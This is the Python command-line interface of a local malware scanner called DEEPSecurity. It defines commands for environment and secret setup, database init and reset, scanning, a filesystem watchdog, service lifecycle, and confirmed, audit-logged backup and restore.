"""Command-line interface.

Usage:
    deepsec init-env        # generate .env with real random secrets (run first!)
    deepsec init-db
    deepsec serve
    deepsec scan /path/to/dir
    deepsec signature-hash /path/to/file
    deepsec intel-update
    deepsec report --days 30
    deepsec purge --days 90
    deepsec watchdog start|stop|status

Config import is lazy: every command that needs settings imports them
inside the function body, so `deepsec init-env` and `--help` work even if
the current environment would fail validation.
"""

from __future__ import annotations

import json
import os
import secrets
import sys
from pathlib import Path

import click


@click.group()
@click.version_option("2.2.0", prog_name="deepsec")
def main() -> None:
    """DEEPSecurity — a safe, local malware scanner."""
    from deepsecurity.logging_config import configure_logging

    # Only configure logging once we're running — some commands bypass it.
    try:
        configure_logging()
    except Exception:
        # Don't let a bad env block `deepsec init-env`.
        pass


# ---------------------------------------------------------------------------
# init-env — bootstrap a working .env from .env.example
# ---------------------------------------------------------------------------


_PLACEHOLDERS = {
    "DEEPSEC_SECRET_KEY": "change-me-to-a-32-char-random-string",
    "DEEPSEC_JWT_SECRET": "change-me-to-another-32-char-random-string",
}


@main.command("init-env")
@click.option(
    "--output",
    default=".env",
    show_default=True,
    type=click.Path(dir_okay=False),
    help="Target .env path.",
)
@click.option(
    "--template",
    default=".env.example",
    show_default=True,
    type=click.Path(dir_okay=False),
    help="Source template.",
)
@click.option(
    "--force",
    is_flag=True,
    help="Overwrite an existing .env (otherwise refuses to clobber).",
)
@click.option(
    "--password",
    default=None,
    help="Dev-user password. Prompts if omitted.",
)
def init_env_cmd(output: str, template: str, force: bool, password: str | None) -> None:
    """Generate a working .env with real random secrets.

    Replaces the DEEPSEC_SECRET_KEY and DEEPSEC_JWT_SECRET placeholders with
    64-char hex strings generated from secrets.token_hex(32). Fills in
    DEEPSEC_DEV_PASSWORD too (prompts if not supplied).
    """
    tpl = Path(template)
    dst = Path(output)

    if not tpl.exists():
        click.echo(f"template not found: {tpl}", err=True)
        sys.exit(1)
    if dst.exists() and not force:
        click.echo(
            f"{dst} already exists. Re-run with --force to overwrite, or edit the file by hand.",
            err=True,
        )
        sys.exit(1)

    if password is None:
        password = click.prompt(
            "dev-user password (used to log in via /api/auth/login)",
            hide_input=True,
            confirmation_prompt=True,
        )

    replacements = {
        **_PLACEHOLDERS,
        "DEEPSEC_DEV_PASSWORD": "",
    }
    generated = {
        "DEEPSEC_SECRET_KEY": secrets.token_hex(32),
        "DEEPSEC_JWT_SECRET": secrets.token_hex(32),
        "DEEPSEC_DEV_PASSWORD": password,
    }

    lines_out: list[str] = []
    for raw in tpl.read_text(encoding="utf-8").splitlines():
        rewrote = False
        stripped = raw.strip()
        if stripped and not stripped.startswith("#") and "=" in stripped:
            key, _, value = stripped.partition("=")
            key = key.strip()
            value = value.strip()
            if key in replacements and (value == replacements[key] or value == ""):
                lines_out.append(f"{key}={generated[key]}")
                rewrote = True
        if not rewrote:
            lines_out.append(raw)

    dst.write_text("\n".join(lines_out) + "\n", encoding="utf-8")
    click.echo(f"wrote {dst}")
    click.echo("  DEEPSEC_SECRET_KEY: generated (64 hex chars)")
    click.echo("  DEEPSEC_JWT_SECRET: generated (64 hex chars)")
    click.echo("  DEEPSEC_DEV_PASSWORD: set from prompt")
    click.echo("")
    click.echo("Next: edit DEEPSEC_SCAN_ROOT in .env, then run `deepsec init-db`.")


# ---------------------------------------------------------------------------
# init-db
# ---------------------------------------------------------------------------


@main.command("init-db")
def init_db_cmd() -> None:
    """Create database tables if absent.

    SAFE. Never drops or alters existing tables.
    If your DB is from a previous schema version, use `deepsec reset-db`.
    """
    from deepsecurity.config import settings
    from deepsecurity.db import init_db
    from deepsecurity.secret_masking import mask_database_url

    init_db()
    click.echo(f"database ready: {mask_database_url(settings.database_url)}")

    # Probe for schema drift and warn — cheap, catches the most common upgrade pitfall.
    try:
        from sqlalchemy import inspect

        from deepsecurity.db import get_engine
        from deepsecurity.models import Base

        insp = inspect(get_engine())
        drift: list[str] = []
        for table_name, table in Base.metadata.tables.items():
            if not insp.has_table(table_name):
                continue
            existing = {c["name"] for c in insp.get_columns(table_name)}
            expected = set(table.columns.keys())
            missing = expected - existing
            if missing:
                drift.append(f"  {table_name}: missing columns {sorted(missing)}")
        if drift:
            click.echo(
                click.style(
                    "\nSCHEMA DRIFT DETECTED — tables exist but are missing columns:",
                    fg="yellow",
                )
            )
            for d in drift:
                click.echo(click.style(d, fg="yellow"))
            click.echo(
                click.style(
                    "\nYour DB predates the current models. Run `deepsec reset-db` "
                    "to drop and recreate (destroys existing rows).",
                    fg="yellow",
                )
            )
    except Exception:
        # Inspection is a best-effort nicety — never fail init-db over it.
        pass


@main.command("reset-db")
@click.option(
    "--yes",
    is_flag=True,
    help="Skip the confirmation prompt.",
)
def reset_db_cmd(yes: bool) -> None:
    """DROP every table and recreate from current models. Destroys data.

    Use when `init-db` reports schema drift after an upgrade, or when you
    want to wipe scan history and start clean.
    """
    from deepsecurity.config import settings
    from deepsecurity.db import get_engine
    from deepsecurity.models import Base
    from deepsecurity.secret_masking import mask_database_url

    click.echo(f"target database: {mask_database_url(settings.database_url)}")
    if not yes:
        click.confirm(
            "This will DROP every deepsecurity table and recreate it. Continue?",
            abort=True,
        )
    engine = get_engine()
    Base.metadata.drop_all(bind=engine)
    Base.metadata.create_all(bind=engine)
    click.echo("database reset: all tables dropped and recreated.")


# ---------------------------------------------------------------------------
# scan
# ---------------------------------------------------------------------------


@main.command("scan")
@click.argument("directory", type=click.Path(exists=True, file_okay=False))
@click.option("--actor", default="cli", show_default=True)
@click.option("--role", default="admin", show_default=True)
@click.option("--no-quarantine", is_flag=True, help="Skip copying detections to quarantine.")
def scan_cmd(directory: str, actor: str, role: str, no_quarantine: bool) -> None:
    """Scan DIRECTORY. Must be inside DEEPSEC_SCAN_ROOT."""
    from deepsecurity.db import init_db
    from deepsecurity.scanner import scan_directory

    init_db()
    summary = scan_directory(
        directory,
        actor=actor,
        user_role=role,
        quarantine_enabled=not no_quarantine,
    )
    click.echo(
        f"session={summary['session_id']}  "
        f"files={summary['total_files']}  "
        f"detections={summary['total_detections']}"
    )


# ---------------------------------------------------------------------------
# signature-hash — useful before any config exists
# ---------------------------------------------------------------------------


@main.command("signature-hash")
@click.argument("path", type=click.Path(exists=True, dir_okay=False))
def signature_hash_cmd(path: str) -> None:
    """Print SHA-256 for PATH (for pasting into a signature list)."""
    # Import lazily so it works before config is valid.
    from deepsecurity.scanner import compute_sha256

    click.echo(compute_sha256(Path(path)))


# ---------------------------------------------------------------------------
# serve
# ---------------------------------------------------------------------------


@main.command("serve")
@click.option("--host", default=None, help="Override DEEPSEC_HOST")
@click.option("--port", type=int, default=None, help="Override DEEPSEC_PORT")
def serve_cmd(host: str | None, port: int | None) -> None:
    """Run the Flask dev server. For production, use gunicorn (see Makefile)."""
    from deepsecurity.api import create_app
    from deepsecurity.config import settings
    from deepsecurity.db import init_db
    from deepsecurity.logging_config import get_logger

    init_db()
    app = create_app()
    log = get_logger(__name__)
    bind_host = host or settings.host
    bind_port = port or settings.port
    log.info("serve.start", host=bind_host, port=bind_port)
    app.run(host=bind_host, port=bind_port, debug=settings.debug)


# ---------------------------------------------------------------------------
# intel-update
# ---------------------------------------------------------------------------


@main.command("intel-update")
def intel_update_cmd() -> None:
    """Pull every configured threat-intel feed into the signature file."""
    from deepsecurity.threat_intel import update_all_feeds

    for res in update_all_feeds():
        status = f"error: {res.error}" if res.error else f"added {res.added}"
        click.echo(f"{res.name}: fetched={res.fetched}  {status}")


# ---------------------------------------------------------------------------
# purge
# ---------------------------------------------------------------------------


@main.command("purge")
@click.option("--days", type=int, default=None, help="Override DEEPSEC_RETENTION_DAYS")
def purge_cmd(days: int | None) -> None:
    """Enforce the retention policy: delete audit / results older than --days."""
    from deepsecurity.compliance import purge_older_than
    from deepsecurity.config import settings

    effective = days if days is not None else settings.retention_days
    counts = purge_older_than(effective)
    click.echo(
        f"purged (> {effective} days): "
        f"audit={counts['audit_deleted']} "
        f"results={counts['results_deleted']} "
        f"sessions={counts['sessions_deleted']}"
    )


# ---------------------------------------------------------------------------
# report
# ---------------------------------------------------------------------------


@main.command("report")
@click.option("--days", type=int, default=30, help="Window in days (default 30)")
def report_cmd(days: int) -> None:
    """Print a compliance report for the last N days as JSON."""
    import json

    from deepsecurity.compliance import DateWindow, generate_report

    rep = generate_report(DateWindow.last_days(days))
    if rep.get("retention", {}).get("oldest_event"):
        rep["retention"]["oldest_event"] = rep["retention"]["oldest_event"].isoformat()
    click.echo(json.dumps(rep, indent=2, default=str))


# ---------------------------------------------------------------------------
# watchdog
# ---------------------------------------------------------------------------


@main.command("self-test")
@click.option("--url", default=None, help="Target server URL (default: use DEEPSEC_HOST/PORT).")
@click.option("--password", default=None, help="Admin password (default: read .env).")
@click.option("--full-scan", is_flag=True, help="Also run a live scan against scan_root.")
@click.option("--verbose", "-v", is_flag=True, help="Show full response bodies on failure.")
def self_test_cmd(url: str | None, password: str | None, full_scan: bool, verbose: bool) -> None:
    """Run the end-to-end smoke test against a running server."""
    import runpy

    from deepsecurity.config import settings

    target_url = url or f"http://{settings.host}:{settings.port}"
    argv = ["scripts/smoke.py", "--url", target_url]
    if password:
        argv += ["--password", password]
    if full_scan:
        argv.append("--full-scan")
    if verbose:
        argv.append("--verbose")

    sys.argv = argv
    script_path = Path(__file__).resolve().parent.parent / "scripts" / "smoke.py"
    try:
        runpy.run_path(str(script_path), run_name="__main__")
    except SystemExit as e:
        sys.exit(e.code)


@main.command("test-loop")
@click.option("--once", is_flag=True, help="Run one pass and exit (good for CI).")
@click.option("--watch", is_flag=True, help="Re-run on source changes (needs `watchdog`).")
@click.option(
    "--interval",
    type=float,
    default=300.0,
    show_default=True,
    help="Seconds between timed loop runs.",
)
@click.option("--no-smoke", is_flag=True, help="Skip the live-HTTP smoke phase.")
@click.option("--url", default=None, help="Server URL for the smoke phase.")
@click.option("--password", default=None, help="Admin password for the smoke phase.")
def test_loop_cmd(
    once: bool,
    watch: bool,
    interval: float,
    no_smoke: bool,
    url: str | None,
    password: str | None,
) -> None:
    """Continuously run all tests (pytest + e2e + live smoke)."""
    import runpy

    from deepsecurity.config import settings

    target_url = url or f"http://{settings.host}:{settings.port}"
    argv = ["scripts/continuous_tests.py", "--url", target_url, "--interval", str(interval)]
    if once:
        argv.append("--once")
    if watch:
        argv.append("--watch")
    if no_smoke:
        argv.append("--no-smoke")
    if password:
        argv += ["--password", password]

    sys.argv = argv
    script_path = Path(__file__).resolve().parent.parent / "scripts" / "continuous_tests.py"
    try:
        runpy.run_path(str(script_path), run_name="__main__")
    except SystemExit as e:
        sys.exit(e.code)


@main.command("integrity")
@click.argument("action", type=click.Choice(["snapshot", "check"]))
def integrity_cmd(action: str) -> None:
    """Self-integrity — snapshot the package hash set, or check against it."""
    import json as _json

    from deepsecurity.integrity import check, report_as_dict, snapshot

    if action == "snapshot":
        r = snapshot()
    else:
        r = check()
    click.echo(_json.dumps(report_as_dict(r), indent=2))


@main.command("kill-pid")
@click.argument("pid", type=int)
@click.option("--reason", required=True, help="Recorded in the audit log.")
@click.option("--force", is_flag=True, help="SIGKILL / kill instead of terminate.")
def kill_pid_cmd(pid: int, reason: str, force: bool) -> None:
    """Terminate a process by PID. Audit-logged."""
    import json as _json

    from deepsecurity.audit import audit_log
    from deepsecurity.processes import kill_process

    result = kill_process(pid, force=force)
    audit_log(
        actor="cli",
        action="process.kill",
        status="ok" if result.get("killed") else "failed",
        details={"pid": pid, "reason": reason, "force": force, "result": result},
    )
    click.echo(_json.dumps(result, indent=2))


@main.command("watchdog")
@click.argument("action", type=click.Choice(["start", "stop", "status"]))
@click.option(
    "--path",
    "paths",
    multiple=True,
    help="Path(s) to watch (repeatable). Only applies to start.",
)
@click.option(
    "--scope",
    type=click.Choice(["user_risk", "system"]),
    default=None,
    help=(
        "Shortcut: 'user_risk' = Downloads + Desktop + Documents + Outlook "
        "cache + %TEMP% (recommended). 'system' = every drive / every common "
        "user path (broad but noisy)."
    ),
)
@click.option(
    "--password",
    default=None,
    help="Admin password. Defaults to DEEPSEC_DEV_PASSWORD from env/.env.",
)
@click.option(
    "--url",
    default=None,
    help="Backend URL (default: http://DEEPSEC_HOST:DEEPSEC_PORT).",
)
def watchdog_cmd(
    action: str,
    paths: tuple[str, ...],
    scope: str | None,
    password: str | None,
    url: str | None,
) -> None:
    """Start / stop / check the real-time file-system watchdog.

    Talks to the backend over HTTP so you see the same state the dashboard
    does — the watchdog runs in the backend's Python process; a separate
    CLI process would have its own (empty) controller. If the backend
    isn't running you'll get a clear connection error instead.
    """
    import json
    import os as _os
    import urllib.error
    import urllib.request
    from pathlib import Path as _Path

    from deepsecurity.config import settings

    base = (url or f"http://{settings.host}:{settings.port}").rstrip("/")

    # Resolve admin password — env, CLI flag, or .env fallback.
    pw = password or _os.environ.get("DEEPSEC_DEV_PASSWORD") or ""
    if not pw:
        env_path = _Path(__file__).resolve().parent.parent / ".env"
        if env_path.exists():
            for line in env_path.read_text(encoding="utf-8").splitlines():
                if line.startswith("DEEPSEC_DEV_PASSWORD="):
                    pw = line.split("=", 1)[1].strip().strip('"').strip("'")
                    break

    def _post(path: str, body: dict, auth: str | None) -> dict:
        req = urllib.request.Request(
            base + path,
            data=json.dumps(body).encode("utf-8"),
            headers={"Content-Type": "application/json"},
            method="POST",
        )
        if auth:
            req.add_header("Authorization", f"Bearer {auth}")
        with urllib.request.urlopen(req, timeout=10) as r:
            return json.loads(r.read().decode("utf-8"))

    def _get(path: str, auth: str | None) -> dict:
        req = urllib.request.Request(base + path, method="GET")
        if auth:
            req.add_header("Authorization", f"Bearer {auth}")
        with urllib.request.urlopen(req, timeout=5) as r:
            return json.loads(r.read().decode("utf-8"))

    # Login (every watchdog route is auth-gated).
    try:
        login = _post(
            "/api/auth/login",
            {"username": "admin", "password": pw},
            auth=None,
        )
    except urllib.error.URLError as exc:
        click.echo(
            f"cannot reach backend at {base}: {exc.reason}\n"
            f"  tip: is ``deepsecurity start`` running?",
            err=True,
        )
        sys.exit(1)
    token = login.get("access_token")
    if not token:
        click.echo(
            "login rejected — bad password? set DEEPSEC_DEV_PASSWORD or pass --password",
            err=True,
        )
        sys.exit(1)

    try:
        if action == "status":
            out = _get("/api/watchdog/status", token)
        elif action == "stop":
            out = _post("/api/watchdog/stop", {}, token)
        else:  # start
            body: dict = {}
            if scope:
                body["scope"] = scope
            if paths:
                body["paths"] = list(paths)
            out = _post("/api/watchdog/start", body, token)
    except urllib.error.HTTPError as exc:
        try:
            payload = json.loads(exc.read().decode("utf-8"))
        except Exception:
            payload = {"error": str(exc)}
        click.echo(json.dumps(payload, indent=2), err=True)
        sys.exit(1)

    click.echo(json.dumps(out, indent=2))


# ---------------------------------------------------------------------------
# Lifecycle — start / stop / status / clean / test
#
# These are the "day-to-day" commands. They wrap ``deepsecurity/lifecycle.py``
# so ``deepsecurity start`` etc. all work from a single top-level CLI.
# ---------------------------------------------------------------------------


@main.command("start")
@click.option("--host", default=None, help="Override DEEPSEC_HOST (backend bind host).")
@click.option("--port", type=int, default=None, help="Override DEEPSEC_PORT (backend).")
@click.option(
    "--tls-cert",
    "tls_cert",
    type=click.Path(dir_okay=False),
    default=None,
    help="Path to a PEM TLS certificate (sets DEEPSEC_TLS_MODE=cert).",
)
@click.option(
    "--tls-key",
    "tls_key",
    type=click.Path(dir_okay=False),
    default=None,
    help="Path to the matching PEM private key.",
)
@click.option(
    "--tls-self-signed",
    "tls_self_signed",
    is_flag=True,
    help=(
        "Generate an ephemeral self-signed cert at boot (data/tls/). "
        "For dev / lab / single-tenant only — browsers will warn on "
        "untrusted CA unless the cert is manually trusted."
    ),
)
@click.option(
    "--frontend-port",
    type=int,
    default=5173,
    show_default=True,
    help="Port for the Vite frontend dev server.",
)
@click.option(
    "--foreground",
    "-f",
    is_flag=True,
    help="Run the backend inline in this terminal (no frontend, no browser).",
)
@click.option(
    "--no-frontend",
    is_flag=True,
    help="Start only the backend; skip Vite and the browser.",
)
@click.option(
    "--no-browser",
    is_flag=True,
    help="Don't auto-open the dashboard in the default browser.",
)
@click.option(
    "--timeout",
    type=float,
    default=30.0,
    show_default=True,
    help="Seconds to wait for the backend /healthz before giving up.",
)
def start_cmd(
    host: str | None,
    port: int | None,
    tls_cert: str | None,
    tls_key: str | None,
    tls_self_signed: bool,
    frontend_port: int,
    foreground: bool,
    no_frontend: bool,
    no_browser: bool,
    timeout: float,
) -> None:
    """Start DEEPSecurity: DB → backend → frontend → open browser.

    Default mode: brings the backend up (the DB is created on first boot),
    starts the Vite frontend, waits for both to report ready, then opens
    the dashboard in your default browser. Writes a PID file so
    ``deepsecurity stop`` / ``deepsecurity status`` know what's running.

    Flags:
        --foreground     backend only, inline, no frontend, no browser
        --no-frontend    backend only (detached), no frontend, no browser
        --no-browser     start both but don't auto-open
        --tls-cert       enable TLS with operator-provided cert + key
        --tls-self-signed enable TLS with an auto-generated self-signed cert
    """
    from deepsecurity import lifecycle

    # CLI flags for TLS feed through DEEPSEC_TLS_* env vars so the
    # spawned backend (a separate Python process via ``flask run``) sees
    # the same configuration we resolve here. Mode precedence:
    # explicit cert/key → cert mode; --tls-self-signed → self-signed mode;
    # neither → leave existing DEEPSEC_TLS_MODE alone (default off).
    if tls_cert and tls_key:
        os.environ["DEEPSEC_TLS_MODE"] = "cert"
        os.environ["DEEPSEC_TLS_CERT"] = str(Path(tls_cert).resolve())
        os.environ["DEEPSEC_TLS_KEY"] = str(Path(tls_key).resolve())
    elif tls_self_signed:
        os.environ["DEEPSEC_TLS_MODE"] = "self-signed"
    elif tls_cert or tls_key:
        click.echo(
            "start: --tls-cert and --tls-key must be provided together",
            err=True,
        )
        sys.exit(2)

    pre = lifecycle.status()
    # If everything we wanted is already up, don't re-spawn — just report
    # and (optionally) re-open the browser.
    want_frontend = not foreground and not no_frontend
    want_browser = not foreground and not no_browser

    all_wanted_up = pre.backend.running and (not want_frontend or pre.frontend.running)
    if all_wanted_up and not foreground:
        click.echo("already running:")
        _print_component("backend ", pre.backend)
        _print_component("frontend", pre.frontend)
        if want_browser:
            import webbrowser

            target = pre.frontend.url if pre.frontend.http_up else pre.backend.url
            try:
                webbrowser.open_new_tab(target)
                click.echo(f"  opened:  {target}")
            except Exception:
                pass
        else:
            click.echo(
                f"  pidfile: {pre.pidfile}\n"
                f"  tip: ``deepsecurity stop`` to stop, ``deepsecurity status`` to recheck"
            )
        return

    try:
        st = lifecycle.start(
            host=host,
            port=port,
            foreground=foreground,
            ready_timeout=timeout,
            backend=True,
            frontend=want_frontend,
            frontend_port=frontend_port,
            open_browser=want_browser,
        )
    except RuntimeError as exc:
        click.echo(f"start failed: {exc}", err=True)
        sys.exit(1)

    if foreground:
        click.echo("server exited")
        return

    click.echo("started:")
    _print_component("backend ", st.backend)
    _print_component("frontend", st.frontend)
    click.echo(f"  pidfile: {st.pidfile}")
    if st.frontend.http_up and want_browser:
        click.echo(f"  opened:  {st.frontend.url}")


def _print_component(label: str, c) -> None:  # type: ignore[no-untyped-def]
    """Helper: one-line status of a ComponentStatus."""
    from deepsecurity import lifecycle  # noqa: F401 — type hint source

    if c.http_up and c.pid_alive:
        state = "up (healthy)"
    elif c.http_up:
        state = "up (not owned by us)"
    elif c.pid_alive:
        state = "starting / unhealthy"
    else:
        state = "down"
    click.echo(f"  {label}  {state:<22}  pid={c.pid if c.pid else '-':<8}  url={c.url}")


@main.command("stop")
@click.option(
    "--timeout",
    type=float,
    default=10.0,
    show_default=True,
    help="Seconds to wait for graceful shutdown before force-kill.",
)
def stop_cmd(timeout: float) -> None:
    """Stop DEEPSecurity (backend + frontend)."""
    from deepsecurity import lifecycle

    pre = lifecycle.status()
    if not pre.running:
        click.echo("nothing to stop — server is not running")
        return

    result = lifecycle.stop(timeout=timeout)
    any_stopped = any(result.values())
    if any_stopped:
        click.echo("stopped:")
        for name, stopped in result.items():
            click.echo(f"  {name}: {'killed' if stopped else 'no-op'}")
    else:
        click.echo("stop completed — nothing was owned by our pidfile")


@main.command("status")
def status_cmd() -> None:
    """Show status of both backend and frontend."""
    from deepsecurity import lifecycle

    st = lifecycle.status()
    click.echo("DEEPSecurity status:")
    _print_component("backend ", st.backend)
    _print_component("frontend", st.frontend)
    click.echo(
        f"  pidfile:      {st.pidfile}\n"
        f"  backend log:  {st.server_log}\n"
        f"  frontend log: {st.frontend_log}"
    )
    if not st.running:
        click.echo("\n  → nothing running. ``deepsecurity start`` to launch.")


@main.command("clean")
@click.option(
    "--yes",
    "-y",
    is_flag=True,
    help="Skip the confirmation prompt.",
)
@click.option(
    "--keep-logs",
    is_flag=True,
    help="Don't delete logs/.",
)
@click.option(
    "--keep-db",
    is_flag=True,
    help="Don't delete the SQLite DB file.",
)
@click.option(
    "--also-safelist",
    is_flag=True,
    help="ALSO delete the operator-curated safelist (off by default — keep it).",
)
@click.option(
    "--services-only",
    is_flag=True,
    help=(
        "Stop the running server (and any hanging worker processes) but "
        "DELETE NOTHING. Use this between iterations of a long-running "
        "loop — the database, logs, quarantine, and integrity snapshot "
        "are all preserved."
    ),
)
def clean_cmd(
    yes: bool,
    keep_logs: bool,
    keep_db: bool,
    also_safelist: bool,
    services_only: bool,
) -> None:
    """Stop the server and (optionally) delete throwaway state.

    By default, stops the server and removes the SQLite DB, quarantine
    contents, logs, and tool caches. The operator-curated safelist is
    kept unless ``--also-safelist`` is passed.

    With ``--services-only`` the command becomes safe to run inside a
    repeated loop: it only stops the server (and any hanging worker
    processes) and leaves every byte of data on disk. This is the
    recommended cleanup step inside ``scripts\\loop_24h.py``.
    """
    from deepsecurity import lifecycle

    if services_only:
        # Stop only — no file deletion. Bypass the plan path entirely so
        # there's no chance a refactor accidentally re-enables a delete.
        try:
            result = lifecycle.stop(timeout=10.0)
        except Exception as exc:
            click.echo(f"clean(services-only): stop failed — {exc}")
            sys.exit(1)
        stopped = sum(1 for v in result.values() if v)
        click.echo(
            f"clean(services-only) done  stopped={stopped}  removed=0  failed=0  detail={result}"
        )
        return

    plan = lifecycle.build_clean_plan(
        logs=not keep_logs,
        database=not keep_db,
        safelist=also_safelist,
    )

    if not plan.anything_to_do:
        click.echo("nothing to clean")
        return

    click.echo("clean plan:")
    if plan.stop_server:
        click.echo("  - stop running server")
    for p in plan.paths:
        click.echo(f"  - delete {p}")

    if not yes and not click.confirm("\nproceed?", default=False):
        click.echo("aborted")
        sys.exit(1)

    counts = lifecycle.execute_clean_plan(plan)
    click.echo(
        f"done  stopped={counts['stopped']}  removed={counts['removed']}  failed={counts['failed']}"
    )


@main.command("test")
@click.option(
    "--once/--loop",
    default=True,
    show_default=True,
    help="One pass and exit (default) or run the continuous 5-minute loop.",
)
@click.option(
    "--interval",
    type=float,
    default=300.0,
    show_default=True,
    help="Seconds between loops (only relevant with --loop).",
)
@click.option(
    "--no-smoke",
    is_flag=True,
    help="Skip the live-HTTP smoke phase (e.g. when running offline).",
)
@click.option(
    "--no-autostart",
    is_flag=True,
    help="Don't autostart the Flask server for the smoke phase.",
)
@click.option("--url", default=None, help="Server URL for the smoke phase.")
@click.option("--password", default=None, help="Admin password for the smoke phase.")
def test_cmd(
    once: bool,
    interval: float,
    no_smoke: bool,
    no_autostart: bool,
    url: str | None,
    password: str | None,
) -> None:
    """Run the full test suite (pytest + e2e + live smoke).

    Thin wrapper around ``scripts/continuous_tests.py`` so you don't have
    to remember the path. ``--once`` is the default — one pass, exit with
    the result code. ``--loop`` runs forever.
    """
    import runpy

    from deepsecurity.config import settings

    target_url = url or f"http://{settings.host}:{settings.port}"
    argv = [
        "scripts/continuous_tests.py",
        "--url",
        target_url,
        "--interval",
        str(interval),
    ]
    if once:
        argv.append("--once")
    if no_smoke:
        argv.append("--no-smoke")
    if no_autostart:
        argv.append("--no-autostart")
    if password:
        argv += ["--password", password]

    sys.argv = argv
    script_path = Path(__file__).resolve().parent.parent / "scripts" / "continuous_tests.py"
    try:
        runpy.run_path(str(script_path), run_name="__main__")
    except SystemExit as e:
        sys.exit(e.code)


# ---------------------------------------------------------------------------
# backup / restore — DB snapshots for SOC2/ISO/HIPAA backup-runbook evidence.
#
# Shape:
#     deepsec backup full   --to <dir>  --keep N  (default keep=7, daily-ish)
#     deepsec backup incremental --to <dir> --keep N  (default keep=24, hourly-ish)
#     deepsec restore --from <path> | --latest  --confirm
#
# Implementation note: ``incremental`` is a misnomer for what it actually
# does — it produces a complete snapshot, just with a tighter rotation
# window. We chose this naming because operators expect the "full /
# incremental" pair from every other backup tool, and the rotation
# difference is the only meaningful axis at our DB scale (50–200 MB).
# When the deploy ever justifies real WAL-shipping deltas, this CLI
# shape can absorb them without breaking compatibility.
# ---------------------------------------------------------------------------


@main.group("backup")
def backup_group() -> None:
    """Take a snapshot of the database for compliance / DR."""
    pass


def _default_backup_dir() -> Path:
    """Default destination: ``<repo_root>/data/backups``.

    Lives under ``data/`` so existing .gitignore rules cover it.
    """
    return Path(__file__).resolve().parent.parent / "data" / "backups"


def _backup_run(*, kind_label: str, to: str | None, keep: int) -> None:
    """Shared body for ``backup full`` / ``backup incremental``."""
    from deepsecurity import backup as backup_mod
    from deepsecurity.audit import audit_log

    dest = Path(to) if to else _default_backup_dir()

    res = backup_mod.full_backup(dest, keep=keep)
    if not res.ok:
        click.echo(f"backup failed: {res.error}", err=True)
        audit_log(
            actor="cli",
            action=f"backup.{kind_label}",
            status="failed",
            details={"to": str(dest), "error": res.error},
        )
        sys.exit(1)

    click.echo(f"backup ok: {res.path}")
    click.echo(f"  size:    {res.size_bytes:,} bytes")
    click.echo(f"  rotated: {len(res.rotated)} older snapshot(s) deleted")
    click.echo(f"  keep:    {keep}")
    audit_log(
        actor="cli",
        action=f"backup.{kind_label}",
        status="ok",
        file_path=str(res.path),
        details={
            "size_bytes": res.size_bytes,
            "rotated": [str(p) for p in res.rotated],
            "keep": keep,
        },
    )


@backup_group.command("full")
@click.option(
    "--to",
    "to_dir",
    type=click.Path(file_okay=False),
    default=None,
    help="Destination directory (default: data/backups).",
)
@click.option(
    "--keep",
    type=int,
    default=7,
    show_default=True,
    help="How many full snapshots to retain after rotation.",
)
def backup_full_cmd(to_dir: str | None, keep: int) -> None:
    """Take a full snapshot of the database (rotation policy: --keep)."""
    _backup_run(kind_label="full", to=to_dir, keep=keep)


@backup_group.command("incremental")
@click.option(
    "--to",
    "to_dir",
    type=click.Path(file_okay=False),
    default=None,
    help="Destination directory (default: data/backups).",
)
@click.option(
    "--keep",
    type=int,
    default=24,
    show_default=True,
    help=("How many snapshots to retain — default 24 fits an hourly cron with 1-day window."),
)
def backup_incremental_cmd(to_dir: str | None, keep: int) -> None:
    """Take a snapshot with the hourly-rotation default (24 by default).

    Functionally identical to ``full`` — produces a complete snapshot —
    but with a tighter retention window. Use with an hourly cron.
    """
    _backup_run(kind_label="incremental", to=to_dir, keep=keep)


@backup_group.command("list")
@click.option(
    "--in",
    "in_dir",
    type=click.Path(file_okay=False),
    default=None,
    help="Directory to inspect (default: data/backups).",
)
def backup_list_cmd(in_dir: str | None) -> None:
    """List existing backups in a directory, newest first."""
    from deepsecurity import backup as backup_mod

    target = Path(in_dir) if in_dir else _default_backup_dir()
    entries = backup_mod.list_backups(target)
    if not entries:
        click.echo(f"no backups found in {target}")
        return
    click.echo(f"backups in {target}:")
    for e in entries:
        click.echo(f"  {e.timestamp.isoformat():32}  {e.size_bytes:>12,} B  {e.path.name}")


@main.command("restore")
@click.option(
    "--from",
    "from_path",
    type=click.Path(dir_okay=False, exists=False),
    default=None,
    help="Specific backup file to restore from.",
)
@click.option(
    "--latest",
    is_flag=True,
    help="Restore the most-recent backup in --in (or data/backups).",
)
@click.option(
    "--in",
    "in_dir",
    type=click.Path(file_okay=False),
    default=None,
    help="Directory to search when using --latest (default: data/backups).",
)
@click.option(
    "--confirm",
    is_flag=True,
    help="Required. Acknowledges that the live database will be overwritten.",
)
@click.option(
    "--force",
    is_flag=True,
    help=(
        "Skip the running-server safety check. Only use this if you know "
        "the server is stopped from outside this host's pidfile."
    ),
)
def restore_cmd(
    from_path: str | None,
    latest: bool,
    in_dir: str | None,
    confirm: bool,
    force: bool,
) -> None:
    """Restore the database from a snapshot. DESTRUCTIVE — requires --confirm.

    Refuses to run while the DEEPSecurity server is up (the server holds
    open file handles into the SQLite DB; replacing the file under it
    yields a corrupt session). Stop with ``deepsec stop`` first.

    Always writes a one-shot safety copy of the current DB to
    ``<dbpath>.pre_restore_<UTC ts>`` before overwriting, so a wrong
    --from is recoverable.
    """
    from deepsecurity import backup as backup_mod
    from deepsecurity import lifecycle
    from deepsecurity.audit import audit_log

    if bool(from_path) == bool(latest):
        click.echo("specify exactly one of --from <path> or --latest", err=True)
        sys.exit(1)

    if not confirm:
        click.echo(
            "restore is destructive — re-run with --confirm to proceed",
            err=True,
        )
        sys.exit(1)

    # Server-running guard — skipped only with --force.
    if not force:
        st = lifecycle.status()
        if st.running:
            click.echo(
                "refusing to restore: DEEPSecurity is currently running.\n"
                "  → run ``deepsec stop`` first, then re-run restore.\n"
                "  (override with --force only if you know what you're doing)",
                err=True,
            )
            sys.exit(1)

    # Resolve the source file.
    if latest:
        target_dir = Path(in_dir) if in_dir else _default_backup_dir()
        entries = backup_mod.list_backups(target_dir)
        if not entries:
            click.echo(f"--latest: no backups found in {target_dir}", err=True)
            sys.exit(1)
        src = entries[0].path
        click.echo(f"restoring from latest: {src}")
    else:
        assert from_path is not None
        src = Path(from_path)

    res = backup_mod.restore(src, confirm=True)
    if not res.ok:
        click.echo(f"restore failed: {res.error}", err=True)
        audit_log(
            actor="cli",
            action="backup.restore",
            status="failed",
            file_path=str(src),
            details={"error": res.error},
        )
        sys.exit(1)

    click.echo(f"restored from: {res.restored_from}")
    if res.safety_backup:
        click.echo(f"  safety copy: {res.safety_backup}")
